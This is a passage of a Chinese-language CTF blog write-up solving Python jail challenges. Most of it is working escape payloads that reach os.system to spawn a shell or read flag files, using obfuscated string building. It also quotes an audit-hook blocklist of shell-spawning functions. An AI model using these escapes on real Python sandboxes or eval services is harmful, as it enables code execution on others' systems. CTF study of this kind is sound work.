</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Now the program has two functions&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;can you use dockerdoor&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1.func&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><p>å…ˆèµ° 1 é€šé“æ‹¿åˆ° key ç„¶ååˆ° 2 éªŒè¯</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/oXO6yphTng82Wrt.png" alt="image.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/cF5eb8VijKOnsyP.png" alt="image.png"></p><h3 id="lke-lke-lke"><a class="markdownIt-Anchor" href="#lke-lke-lke">#</a> l@ke l@ke l@ke</h3><p>è¿˜æ˜¯ä¸¤æ­¥èµ°ï¼Œé€šé“ 1ï¼Œé•¿åº¦ä¸è¶…è¿‡ 6 æ¥è·å– keyï¼Œé€šé“ 2 éªŒè¯ key</p><p>å¯¹äºé€šé“ 1ï¼Œæˆ‘ä»¬è°ƒç”¨ <code>help()</code>  è¿›å…¥å‡½æ•°ï¼Œè¾“å…¥ <code>server</code>  æŸ¥çœ‹ key<br><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/kAnQM9qpgbdLOF6.png" alt="image.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/HYlOA8tLzQqD3x5.png" alt="image.png"></p><h3 id="calc_jail_beginner_level4"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level4">#</a> calc_jail_beginner_level4</h3><p>å°† <code>'__loader__', '__import__', 'compile', 'eval', 'exec', 'chr'</code>  ç­‰å‡½æ•°éƒ½ ban æ‰äº† åé¢åˆå°†å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€åå¼•å·ç»™ ban äº†</p><p>å°è¯•ä½¿ç”¨ä¹‹å‰çš„ SSTI æ³¨å…¥ å…ˆæŸ¥è¯¢ object ç±»ä¸‹çš„å­ç±» æŸ¥çœ‹å¯ä»¥ä½¿ç”¨çš„æ¨¡å—</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure></div><p>å‘ç°å¯ä»¥ä½¿ç”¨ os æ¨¡å—</p><p>ç¦ç”¨äº† chrï¼Œå¯ä»¥ä½¿ç”¨ byte []</p><p>payloadï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/C2ihAFwdWP8kR7r.png" alt="image.png"></p><p>å¦å¤–ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨ bytes () å‡½æ•° çŒœæµ‹ flag æ–‡ä»¶çš„ä½ç½®å’Œåå­— å¯ä»¥ç›´æ¥å¯¹  <code>open('flag').read()</code>  è¿›è¡Œè½¬åŒ– ç›´æ¥è¯»å– flag</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(bytes([102,108,97,103]).decode()).read()</span><br></pre></td></tr></table></figure></div><h3 id="calc_jail_beginner_level405"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level405">#</a> calc_jail_beginner_level4.0.5</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/xKwXD1flzSsPWyB.png" alt="image.png"></p><h3 id="calc_jail_beginner_level41"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level41">#</a> calc_jail_beginner_level4.1</h3><p>æ²¡æœ‰ hint äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è„‘æ´çš„ç¢°æ’äº†</p><p>è¿æ¥é¶æœº</p><p><code>Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and </code> ,&quot;,â€™ `</p><p>bytes [] è¢« ban äº†ï¼Œå°±éœ€è¦ç”¨ type äº†ï¼ŒäºŒè€…çš„å…³ç³»ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system == [bytes([115,121,115,116,101,109]).decode()]</span><br><span class="line">&quot;system&quot; == (type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()</span><br></pre></td></tr></table></figure></div><p>åˆ©ç”¨ä¸‹é¢ payload å¯ä»¥æ‰§è¡Œ lsï¼ŒåŒç†å¯ä»¥ <code>cat flag</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/ov8fnNjB6uL1Dza.png" alt="image.png"></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨ Show subclasses with tuple æ‰¾åˆ° bytes ç±»ï¼šç»“æœä¸º bytes ç±»çš„ç´¢å¼•ä¸º 6</p><p>å¯ä»¥æ„é€  payload æ‹¿åˆ° sh</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/cCetM5DzxWAsQK8.png" alt="image.png"></p><p>ä¹Ÿå¯ä»¥åˆ©ç”¨ <code>__doc__</code> getshell</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])</span><br></pre></td></tr></table></figure></div><h3 id="calc_jail_beginner_level42"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level42">#</a> calc_jail_beginner_level4.2</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&quot;,&#x27;,+ Good luck!</span><br></pre></td></tr></table></figure></div><p>åŠ å·è¢« ban äº†ï¼Œå¯ä»¥ç”¨ <code>__add__</code> ä»£æ›¿</p><p>è·Ÿ 4.1 ç±»ä¼¼æ‰§è¡Œ <code>system(&quot;flag_y0u_CaNt_FiNd_mE&quot;)</code></p><p>payloadï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([99]).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([32])).__add__(type(str(1).encode())([102])).__add__(type(str(1).encode())([108])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([103])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([48])).__add__(type(str(1).encode())([117])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([67])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([70])).__add__(type(str(1).encode())([105])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([100])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([109])).__add__(type(str(1).encode())([69]))).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/xXR5rLibdj3B26q.png" alt="image.png"></p><p>ä¹Ÿå¯ä»¥ç»§ç»­ç”¨ 4.1 çš„åˆ©ç”¨ bytes ç´¢å¼•çš„ payload</p><p>å’Œåˆ©ç”¨ <code>__doc__</code> çš„æ–¹æ³•ï¼Œä½†éœ€è¦åˆ©ç”¨ <code>join</code>  çš„æ‹¼æ¥æ–¹å¼</p><p>payloadï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))</span><br></pre></td></tr></table></figure></div><h3 id="calc_jail_beginner_level43"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level43">#</a> calc_jail_beginner_level4.3</h3><p><code>Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and </code> ,&quot;,â€™,+`</p><p>type ä¹Ÿè¢« ban äº†ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ <code>list(dict(system=114514))[0]</code>  è·å– <code>system</code>  è¿™ä¸ªå­—ç¬¦ä¸²</p><p>å› æ­¤ç›´æ¥æ‰§è¡Œ <code>system(sh)</code></p><p>payloadï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/07/sBJqXm4ic39ZnxO.png" alt="image.png"></p><p>å¹¶ä¸”ï¼Œä¸Šé¢ä¸¤é“é¢˜çš„åä¸¤ç§æ–¹æ³•è¿˜å¯ä»¥ç”¨</p><h3 id="calc_jail_beginner_level51"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level51">#</a> calc_jail_beginner_level5.1</h3><p>å°è¯•ä¹‹åå‘ç° <code>import</code> ã€ <code>open</code>  éƒ½è¢« ban äº†</p><p>å°è¯• <code>dir()</code> ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/vCoTzceO1lr8d43.png" alt="image.png"></p><p>ä¸€è·¯è·Ÿè¿›</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/pR4b81VMro3AYzF.png" alt="image.png"></p><p>å‘ç° encodeï¼Œç›´æ¥åˆ©ç”¨</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/aU1losjKCz6pn7q.png" alt="image.png"></p><h3 id="lake-lake-lake-2"><a class="markdownIt-Anchor" href="#lake-lake-lake-2">#</a> lake lake lake</h3><p>hook äº†å¾ˆå¤šå‡½æ•°</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>,<span class="string">&#x27;code.__new__&#x27;</span>,<span class="string">&#x27;function.__new__&#x27;</span>,<span class="string">&#x27;cpython._PySys_ClearAuditHooks&#x27;</span>,<span class="string">&#x27;open&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br></pre></td></tr></table></figure></div><p>åˆ†æä¸€ä¸‹çŒœæ•°å­—çš„å‡½æ•°</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guesser</span>():</span><br><span class="line">    game_score = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_data = eval_func(<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seems not right! please guess it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> game_score</span><br></pre></td></tr></table></figure></div><p>å¯çŸ¥æˆ‘ä»¬éœ€è¦çŒœå‡º <code>right_guesser_question_answer</code>  æ‰å¯ä»¥è·å– flagï¼ŒåŒæ—¶è¿˜ç»™ <code>sys.stdout</code> ã€ <code>sys.seterr</code>  è¿›è¡Œäº†é‡å®šå‘ï¼Œè°ƒç”¨ print æ— æ³•è¾“å‡ºã€‚</p><p>ä¸€äº›è§£é‡Šï¼š<a class="link" href="https://blog.csdn.net/MTbaby/article/details/53159053">python çš„ sys.stdout é‡å®šå‘ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>ä½†æ˜¯å¯ä»¥é€šè¿‡ <code>__import__(&quot;sys&quot;).__stdout__.write()</code>  å»è¾“å…¥ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ï¼Œè¯»æ–‡ä»¶ï¼Œç„¶åè¾“å‡º</p><p>ç”¨ os.open æ‰“å¼€æ–‡ä»¶ï¼Œç„¶åç”¨ os.read è¯»æ–‡ä»¶ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨ <code>__import__('io').open(&quot;flag&quot;).read()</code></p><p>payloadï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(__import__(&quot;os&quot;).read(__import__(&quot;os&quot;).open(&quot;flag&quot;,__import__(&quot;os&quot;).O_RDONLY), 0x114).decode())</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/LWZ5ypkOlGCn3d7.png" alt="image.png"></p><h3 id="lak3-lak3-lak3"><a class="markdownIt-Anchor" href="#lak3-lak3-lak3">#</a> lak3 lak3 lak3</h3><p>ç›´æ¥æŠŠ ioã€system ä¹‹ç±»çš„å‡½æ•°å…¨ç»™ hook æ‰äº†ï¼Œè¿˜æŠŠä¸Šä¸€é¢˜çš„ open ç­‰æ›´å¤šçš„å‡½æ•°ç»™ ban äº†</p><p>ä¹Ÿæ˜¯çŒœæ•°å­—ï¼Œç­”æ¡ˆåœ¨ <code>right_guesser_question_answer</code> ï¼Œæƒ³åŠæ³•è·å–è¯¥å€¼</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/B16ZFDXtSVz9R3h.png" alt="image.png"></p><p>å¯ä»¥ä½¿ç”¨ <code>__import__(&quot;sys&quot;).__stdout__.write</code>  å»è¿›è¡Œæ ‡å‡†è¾“å‡ºï¼Œ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&#x27;sys&#x27;)._getframe(1)))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/xqvCfP4M93aW1Uu.png" alt="image.png"></p><p>è¿™é‡Œçš„ frame å¯¹è±¡æŒ‡å‘äº†â€™/home/ctf/./server.pyâ€™è¿™ä¸ª fileï¼Œé‚£ä¹ˆç›´æ¥è°ƒç”¨ f_locals å±æ€§æŸ¥çœ‹å˜é‡</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;sys&quot;).__stdout__.write(str(__import__(&#x27;sys&#x27;)._getframe(1).f_locals))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/1bPN2qLovwr9S5T.png" alt="image.png"></p><p>æœ€ç»ˆ payloadï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int(str(__import__(&#x27;sys&#x27;)._getframe(1).f_locals[&quot;right_guesser_question_answer&quot;]))</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/08/SL9hMJGDt3C8scq.png" alt="image.png"></p><h3 id="sfe-safeeval"><a class="markdownIt-Anchor" href="#sfe-safeeval">#</a> s@Fe safeeval</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Black <span class="type">List</span>:</span><br><span class="line"></span><br><span class="line">[</span><br><span class="line"><span class="string">&#x27;POP_TOP&#x27;</span>,<span class="string">&#x27;ROT_TWO&#x27;</span>,<span class="string">&#x27;ROT_THREE&#x27;</span>,<span class="string">&#x27;ROT_FOUR&#x27;</span>,<span class="string">&#x27;DUP_TOP&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;BUILD_LIST&#x27;</span>,<span class="string">&#x27;BUILD_MAP&#x27;</span>,<span class="string">&#x27;BUILD_TUPLE&#x27;</span>,<span class="string">&#x27;BUILD_SET&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;BUILD_CONST_KEY_MAP&#x27;</span>, <span class="string">&#x27;BUILD_STRING&#x27;</span>,<span class="string">&#x27;LOAD_CONST&#x27;</span>,<span class="string">&#x27;RETURN_VALUE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;STORE_SUBSCR&#x27;</span>, <span class="string">&#x27;STORE_MAP&#x27;</span>,<span class="string">&#x27;LIST_TO_TUPLE&#x27;</span>, <span class="string">&#x27;LIST_EXTEND&#x27;</span>, <span class="string">&#x27;SET_UPDATE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;DICT_UPDATE&#x27;</span>, <span class="string">&#x27;DICT_MERGE&#x27;</span>,<span class="string">&#x27;UNARY_POSITIVE&#x27;</span>,<span class="string">&#x27;UNARY_NEGATIVE&#x27;</span>,<span class="string">&#x27;UNARY_NOT&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;UNARY_INVERT&#x27;</span>,<span class="string">&#x27;BINARY_POWER&#x27;</span>,<span class="string">&#x27;BINARY_MULTIPLY&#x27;</span>,<span class="string">&#x27;BINARY_DIVIDE&#x27;</span>,<span class="string">&#x27;BINARY_FLOOR_DIVIDE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;BINARY_TRUE_DIVIDE&#x27;</span>,<span class="string">&#x27;BINARY_MODULO&#x27;</span>,<span class="string">&#x27;BINARY_ADD&#x27;</span>,<span class="string">&#x27;BINARY_SUBTRACT&#x27;</span>,<span class="string">&#x27;BINARY_LSHIFT&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;BINARY_RSHIFT&#x27;</span>,<span class="string">&#x27;BINARY_AND&#x27;</span>,<span class="string">&#x27;BINARY_XOR&#x27;</span>,<span class="string">&#x27;BINARY_OR&#x27;</span>,<span class="string">&#x27;MAKE_FUNCTION&#x27;</span>, <span class="string">&#x27;CALL_FUNCTION&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">some code:</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> pwnlib.util.safeeval <span class="keyword">as</span> safeeval</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(expr(input_data))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expr</span>(<span class="params">n</span>):</span><br><span class="line"><span class="keyword">if</span> TURING_PROTECT_SAFE:</span><br><span class="line">m = safeeval.test_expr(n, blocklist_codes)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">eval</span>(m)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> safeeval.expr(n)</span><br></pre></td></tr></table></figure></div><p>å¯¹æ¯”ä¸‹ pwnlib.util.safeeval ä¸­çš„ä»£ç ï¼Œå¯ä»¥çœ‹åˆ° blacklist ä¸­å¤šäº†ä¸¤ä¸ªå¯ä»¥æ‰§è¡Œçš„ opcode</p><blockquote><p>MAKE_FUNCTION<br>CALL_FUNCTION</p></blockquote><p>å¾ˆæ˜¾ç„¶å‡ºé¢˜äººæƒ³è®©æˆ‘ä»¬æ‰§è¡Œå‡½æ•°è°ƒç”¨ / ç¼–å†™ã€‚</p><p>ç¬¬ä¸€æ—¶é—´èƒ½æƒ³åˆ°çš„æ˜¯ lambdaï¼Œç„¶åç›´æ¥è°ƒç”¨å°±è¡Œäº†ï¼Œpayload ä¸ºï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lambda:os.system(&#x27;cat flag&#x27;))()</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/09/rqJ3FA4O5Dkp76U.png" alt="image.png"></p><h3 id="calc_jail_beginner_level6"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level6">#</a> calc_jail_beginner_level6</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> _                _                           _       _ _   _                _   __  </span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | / /  </span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_  </span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ | <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/ </span></span><br><span class="line"><span class="string">              __/ |                          _/ |                                     </span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                                                                                                              </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">Welcome to the python jail</span></span><br><span class="line"><span class="string">Let&#x27;</span>s have an beginner jail of calc</span><br><span class="line">Enter your expression <span class="keyword">and</span> I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">White <span class="built_in">list</span> of audit hook ===&gt; builtins.<span class="built_in">input</span>,builtins.<span class="built_in">input</span>/result,<span class="built_in">exec</span>,<span class="built_in">compile</span></span><br><span class="line">Some code of python jail:</span><br><span class="line"></span><br><span class="line">  dict_global = <span class="built_in">dict</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">      <span class="keyword">except</span> EOFError:</span><br><span class="line">          <span class="built_in">print</span>()</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">      <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&#x27;bye~~&#x27;</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">if</span> input_data == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          complie_code = <span class="built_in">compile</span>(input_data, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">      <span class="keyword">except</span> SyntaxError <span class="keyword">as</span> err:</span><br><span class="line">          <span class="built_in">print</span>(err)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">          <span 